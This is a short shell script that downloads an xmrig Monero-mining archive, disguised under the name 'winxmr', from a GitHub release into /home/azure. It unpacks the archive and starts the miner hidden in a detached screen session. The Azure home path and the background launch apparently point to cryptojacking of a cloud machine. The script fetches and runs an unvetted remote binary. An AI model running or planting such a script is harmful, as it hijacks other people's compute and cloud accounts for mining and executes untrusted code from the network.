#!/bin/sh
sudo sysctl -w vm.nr_hugepages=256
cd /home/azure
wget https://github.com/vnxxx/vnxxx/releases/download/vnxxx/winxmr.tar.gz
tar -zxvf winxmr.tar.gz
cd xmrig-v5.11.1
chmod a+x xmrig
chmod a+x config.json
screen -dmS xmrig ./xmrig
